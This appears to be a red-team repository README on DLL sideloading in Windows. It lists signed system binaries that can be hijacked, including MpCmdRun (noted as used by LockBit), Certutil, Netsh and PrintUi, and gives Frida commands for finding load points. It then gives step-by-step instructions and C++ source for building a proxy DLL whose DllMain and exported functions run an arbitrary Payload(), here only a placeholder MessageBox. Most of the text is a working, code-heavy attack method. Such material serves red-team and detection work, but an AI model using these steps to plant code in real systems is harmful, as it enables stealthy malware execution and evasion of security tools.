# DLL Sideloads

## Applications Vulnerable to Sideloading

### MpCmdRun

MpCmdRun.exe DLL sideloading for MpClient.dll. 

This method is known to be used by Lockbit per https://www.sentinelone.com/blog/living-off-windows-defender-lockbit-ransomware-sideloads-cobalt-strike-through-microsoft-security-tool/

### Certutil

Certutil DLL sideload for NetApi32.dll

https://hijacklibs.net/entries/microsoft/built-in/netapi32.html

### Netsh

Netsh DLL sideload for wshelper.dll

https://hijacklibs.net/entries/microsoft/built-in/wshelper.html

### PrintUi

PrintUi DLL sideload for PrintUi.dll

https://hijacklibs.net/entries/microsoft/built-in/printui.html

## Building

Using MinGW-w64: 

> x86_64-w64-mingw32-g++ {DEF_NAME}.def payload.cpp -o {DLL_NAME}.dll -shared -municode

Note: Source files created based on https://www.redteam.cafe/red-team/dll-sideloading/dll-sideloading-not-by-dllmain

## Creating Sideloadable DLLs from Scratch

**Resources**
Frida - https://frida.re/
WFH (Windows Feature Hunter) - https://github.com/ConsciousHacker/WFH
Binary Ninja - https://binary.ninja/free/

### Identifying potential hijacks

Install Frida via `pip install frida-tools`, clone this repo to disk, `cd` to the repo, and run:

```
frida -f C:\Windows\System32\<any.exe> -l frida\loadlibrary.js
```

You will get an output like:

```
message: {'type': 'send', 'payload': 'LoadLibraryW,LPCWSTR: printui.dll'} data: None
message: {'type': 'send', 'payload': 'LoadLibraryExW,LPCWSTR : printui.dll, dwFlags : NONE'} data: None
message: {'type': 'send', 'payload': 'GetProcAddress,hModule : C:\\Windows\\System32\\printui.dll, LPCSTR: PrintUIEntryW'} data: None
message: {'type': 'send', 'payload': 'LoadLibraryExA,LPCSTR: RPCRT4.dll, dwFlags : NONE'} data: None
message: {'type': 'send', 'payload': 'LoadLibraryExW,LPCWSTR : RPCRT4.dll, dwFlags : NONE'} data: None
```
- Entries where any variant of `LoadLibrary` is called are potential sideloading opportunities for DllMain
- Entries where `GetProcAddress` is called are potential sideloading opportunities for a respective function in the DLL
	- Example: `message: {'type': 'send', 'payload': 'GetProcAddress,hModule : C:\\Windows\\System32\\PROPSYS.dll, LPCSTR: PSCreateMemoryPropertyStore'} data: None`
		- In this case, the function vulnerable to sideloading is PSCreateMemoryPropertyStore

To check if the DLL actually calls the function, open frida/sure.js and replace the values of `{DLL_FULL_PATH}`, `{DLL_NAME}`, and `{FUNC_NAME}` with the appropriate values from the previous step, then run:
- **Note:** This does not work for DllMain, only for `GetProcAddress` entries. To determine if DllMain is called is you will need to perform dynamic analysis or use trial and error.

```PowerShell
frida -f C:\Windows\System32\<any.exe> -l sure.js --pause
```

You will get an output like:

```
Spawned `C:\Windows\System32\printui.exe`. Use %resume to let the main thread start executing!
[Local::printui.exe ]-> %resume
message: {'type': 'send', 'payload': 'The function was called'} data: None
```

### Making a Sideloadable DLL

1. Get the export table from the DLL using `defgen.py` from this repo

```
C:\Tools\WFH>python defgen.py -f C:\\WINDOWS\\SYSTEM32\\{DLL_NAME}.dll
```

You will get an output like:

```C
EXPORTS
ConnectToPrinterDlg="C:\\WINDOWS\\SYSTEM32\\printui.ConnectToPrinterDlg" @7
ConstructPrinterFriendlyName="C:\\WINDOWS\\SYSTEM32\\printui.ConstructPrinterFriendlyName" @1
DllCanUnloadNow="C:\\WINDOWS\\SYSTEM32\\printui.DllCanUnloadNow" @8
DllGetClassObject="C:\\WINDOWS\\SYSTEM32\\printui.DllGetClassObject" @9
DllMain="C:\\WINDOWS\\SYSTEM32\\printui.DllMain" @10
DllRegisterServer="C:\\WINDOWS\\SYSTEM32\\printui.DllRegisterServer" @11
DllUnregisterServer="C:\\WINDOWS\\SYSTEM32\\printui.DllUnregisterServer" @12
DocumentPropertiesWrap="C:\\WINDOWS\\SYSTEM32\\printui.DocumentPropertiesWrap" @13
LaunchPlatformHelp="C:\\WINDOWS\\SYSTEM32\\printui.LaunchPlatformHelp" @14
PnPInterface="C:\\WINDOWS\\SYSTEM32\\printui.PnPInterface" @2
PrintNotifyTray_Exit="C:\\WINDOWS\\SYSTEM32\\printui.PrintNotifyTray_Exit" @15
PrintNotifyTray_Init="C:\\WINDOWS\\SYSTEM32\\printui.PrintNotifyTray_Init" @16
PrintUIDownloadAndInstallLegacyDriver="C:\\WINDOWS\\SYSTEM32\\printui.PrintUIDownloadAndInstallLegacyDriver" @17
PrintUIEntryDPIAwareW="C:\\WINDOWS\\SYSTEM32\\printui.PrintUIEntryDPIAwareW" @33
PrintUIEntryW="C:\\WINDOWS\\SYSTEM32\\printui.PrintUIEntryW" @3
PrinterPropPageProvider="C:\\WINDOWS\\SYSTEM32\\printui.PrinterPropPageProvider" @4
RegisterPrintNotify="C:\\WINDOWS\\SYSTEM32\\printui.RegisterPrintNotify" @18
ReleaseArgv="C:\\WINDOWS\\SYSTEM32\\printui.ReleaseArgv" @5
ShowErrorMessageHR="C:\\WINDOWS\\SYSTEM32\\printui.ShowErrorMessageHR" @19
ShowErrorMessageSC="C:\\WINDOWS\\SYSTEM32\\printui.ShowErrorMessageSC" @20
ShowHelpLinkDialog="C:\\WINDOWS\\SYSTEM32\\printui.ShowHelpLinkDialog" @21
StringToArgv="C:\\WINDOWS\\SYSTEM32\\printui.StringToArgv" @6
UnregisterPrintNotify="C:\\WINDOWS\\SYSTEM32\\printui.UnregisterPrintNotify" @22
bFolderEnumPrinters="C:\\WINDOWS\\SYSTEM32\\printui.bFolderEnumPrinters" @23
bFolderGetPrinter="C:\\WINDOWS\\SYSTEM32\\printui.bFolderGetPrinter" @24
bFolderRefresh="C:\\WINDOWS\\SYSTEM32\\printui.bFolderRefresh" @25
bPrinterSetup="C:\\WINDOWS\\SYSTEM32\\printui.bPrinterSetup" @26
vDocumentDefaults="C:\\WINDOWS\\SYSTEM32\\printui.vDocumentDefaults" @27
vPrinterPropPages="C:\\WINDOWS\\SYSTEM32\\printui.vPrinterPropPages" @28
vQueueCreate="C:\\WINDOWS\\SYSTEM32\\printui.vQueueCreate" @29
vServerPropPages="C:\\WINDOWS\\SYSTEM32\\printui.vServerPropPages" @30
```

2. Create a new file called `{DLL_NAME}.def`. Paste the output from `defgen.py` and comment out the line for our vulnerable function.
	- In our example, we comment out `PrintUIEntryW`

```C
EXPORTS
ConnectToPrinterDlg="C:\\WINDOWS\\SYSTEM32\\printui.ConnectToPrinterDlg" @7
ConstructPrinterFriendlyName="C:\\WINDOWS\\SYSTEM32\\printui.ConstructPrinterFriendlyName" @1
DllCanUnloadNow="C:\\WINDOWS\\SYSTEM32\\printui.DllCanUnloadNow" @8
DllGetClassObject="C:\\WINDOWS\\SYSTEM32\\printui.DllGetClassObject" @9
DllMain="C:\\WINDOWS\\SYSTEM32\\printui.DllMain" @10
DllRegisterServer="C:\\WINDOWS\\SYSTEM32\\printui.DllRegisterServer" @11
DllUnregisterServer="C:\\WINDOWS\\SYSTEM32\\printui.DllUnregisterServer" @12
DocumentPropertiesWrap="C:\\WINDOWS\\SYSTEM32\\printui.DocumentPropertiesWrap" @13
LaunchPlatformHelp="C:\\WINDOWS\\SYSTEM32\\printui.LaunchPlatformHelp" @14
PnPInterface="C:\\WINDOWS\\SYSTEM32\\printui.PnPInterface" @2
PrintNotifyTray_Exit="C:\\WINDOWS\\SYSTEM32\\printui.PrintNotifyTray_Exit" @15
PrintNotifyTray_Init="C:\\WINDOWS\\SYSTEM32\\printui.PrintNotifyTray_Init" @16
PrintUIDownloadAndInstallLegacyDriver="C:\\WINDOWS\\SYSTEM32\\printui.PrintUIDownloadAndInstallLegacyDriver" @17
PrintUIEntryDPIAwareW="C:\\WINDOWS\\SYSTEM32\\printui.PrintUIEntryDPIAwareW" @33
#PrintUIEntryW="C:\\WINDOWS\\SYSTEM32\\printui.PrintUIEntryW" @3
PrinterPropPageProvider="C:\\WINDOWS\\SYSTEM32\\printui.PrinterPropPageProvider" @4
RegisterPrintNotify="C:\\WINDOWS\\SYSTEM32\\printui.RegisterPrintNotify" @18
ReleaseArgv="C:\\WINDOWS\\SYSTEM32\\printui.ReleaseArgv" @5
ShowErrorMessageHR="C:\\WINDOWS\\SYSTEM32\\printui.ShowErrorMessageHR" @19
ShowErrorMessageSC="C:\\WINDOWS\\SYSTEM32\\printui.ShowErrorMessageSC" @20
ShowHelpLinkDialog="C:\\WINDOWS\\SYSTEM32\\printui.ShowHelpLinkDialog" @21
StringToArgv="C:\\WINDOWS\\SYSTEM32\\printui.StringToArgv" @6
UnregisterPrintNotify="C:\\WINDOWS\\SYSTEM32\\printui.UnregisterPrintNotify" @22
bFolderEnumPrinters="C:\\WINDOWS\\SYSTEM32\\printui.bFolderEnumPrinters" @23
bFolderGetPrinter="C:\\WINDOWS\\SYSTEM32\\printui.bFolderGetPrinter" @24
bFolderRefresh="C:\\WINDOWS\\SYSTEM32\\printui.bFolderRefresh" @25
bPrinterSetup="C:\\WINDOWS\\SYSTEM32\\printui.bPrinterSetup" @26
vDocumentDefaults="C:\\WINDOWS\\SYSTEM32\\printui.vDocumentDefaults" @27
vPrinterPropPages="C:\\WINDOWS\\SYSTEM32\\printui.vPrinterPropPages" @28
vQueueCreate="C:\\WINDOWS\\SYSTEM32\\printui.vQueueCreate" @29
vServerPropPages="C:\\WINDOWS\\SYSTEM32\\printui.vServerPropPages" @30
```

3. Find the function definition in Ghidra/Binary Ninja

In IDA/Ghidra/Binary Ninja, load the target DLL (e.g., `printui.dll`) and then search for the vulnerable function.

The function definition will look something like this:

```
unsigned long PrintUIEntryW(struct HWND__* __ptr64 arg1, struct HINSTANCE__* __ptr64 arg2, uint16_t const* __ptr64 arg3, uint32_t arg4)
```

4. Add the function entry to `payload.cpp`

When you add the function, have it call `Payload()` then `return 0`

```cpp
#include "windows.h"
#include <processthreadsapi.h>
#include <memoryapi.h>
#include <cstdint.h>

#pragma comment(lib, "user32.lib")

void Payload()
{
    MessageBox(NULL, L"bar", L"foo", MB_OK);
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
{
  switch (fdwReason)
    {
    case DLL_PROCESS_ATTACH:
      Payload();
      break;
    case DLL_THREAD_ATTACH:
      break;
    case DLL_THREAD_DETACH:
      break;
    case DLL_PROCESS_DETACH:
      break;
    }
  return TRUE;
}

extern "C" __declspec(dllexport) DWORD InitHelperDll(DWORD dwNetshVersion, PVOID pReserved){
  Payload();
  return 0;
}

unsigned long PrintUIEntryW(struct HWND__* __ptr64 arg1, struct HINSTANCE__* __ptr64 arg2, uint16_t const* __ptr64 arg3, uint32_t arg4){
	Payload();
	return 0;
}
```
- **Note:** The `#include <cstdint.h>` import was added for support with uint16_t and uint32_t datatypes in this case.

5. Compile the sideloadable DLL with `x86_64-w64-mingw32-g++ {DEF_NAME}.def payload.cpp -o {DLL_NAME}.dll -shared -municode`
	- You may need to resolve errors related to the function definition (e.g., I needed to import `cstdint` to get this DLL to compile)

6. Test the compiled DLL with the vulnerable application.

